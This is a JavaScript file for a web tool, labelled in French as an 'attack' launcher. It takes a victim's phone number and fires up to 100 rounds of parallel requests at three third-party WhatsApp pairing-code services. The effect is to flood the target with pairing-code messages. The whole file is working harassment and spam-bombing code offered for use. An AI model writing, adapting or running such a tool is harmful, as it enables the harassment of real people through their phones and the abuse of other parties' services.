const btn = document.getElementById('action-btn');
const numberInput = document.getElementById('target-number');
const countInput = document.getElementById('request-count');
const statusText = document.getElementById('status-text');

const API_URLS = [
    "https://qr-pair-anyav2.koyeb.app/code?number=",
    "https://prabath-md-pair-web-v2-slk.koyeb.app/code?number=",
    "https://hunter-xmd-pair2.onrender.com/code?number="
];

async function sendSingleRequest(apiUrl, number) {
    const url = apiUrl + encodeURIComponent(number);
    try {
        const response = await fetch(url);
        return { success: response.ok, status: response.status };
    } catch {
        return { success: false, status: 0 };
    }
}

async function launchAttack() {
    let rawNumber = numberInput.value.trim();
    if (!rawNumber || rawNumber.length < 8) {
        statusText.innerText = "❌ ERREUR: Numéro invalide !";
        return;
    }

    let count = parseInt(countInput.value);
    if (isNaN(count) || count < 1) count = 1;
    if (count > 100) count = 100;

    btn.disabled = true;
    btn.innerText = "🔴 ATTAQUE EN COURS...";
    statusText.innerText = `⚡ PARALLÈLE (0/${count})...`;

    const counterDisplay = document.createElement('div');
    counterDisplay.style.cssText = `text-align: center; font-size: 48px; font-weight: 900; color: #00ffff; margin: 20px 0; font-family: 'Orbitron', sans-serif; text-shadow: 0 0 20px #00ffff88;`;
    counterDisplay.innerText = '0';
    btn.parentNode.insertBefore(counterDisplay, btn.nextSibling);

    let totalSuccess = 0, totalErrors = 0, current = 0;
    const startTime = Date.now();

    for (let i = 0; i < count; i++) {
        const tasks = API_URLS.map(apiUrl => sendSingleRequest(apiUrl, rawNumber));
        const results = await Promise.all(tasks);
        
        results.forEach(r => {
            if (r.success) totalSuccess++;
            else totalErrors++;
        });

        current++;
        counterDisplay.innerText = current;
        statusText.innerText = `⚡ PARALLÈLE (${current}/${count})...`;

        if (i < count - 1) {
            await new Promise(r => setTimeout(r, 50));
        }
    }

    counterDisplay.remove();
    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
    const totalCalls = count * API_URLS.length;

    let finalMsg = `✅ TERMINÉ (${duration}s) ! ${totalSuccess}/${totalCalls} réussies, ${totalErrors} erreurs.`;
    if (totalSuccess === 0) {
        finalMsg = `❌ ÉCHEC (${duration}s) ! Aucune API n'a répondu.`;
    }
    
    statusText.innerText = finalMsg;
    btn.innerText = "LANCER L'ATTAQUE 🔥";
    btn.disabled = false;
}
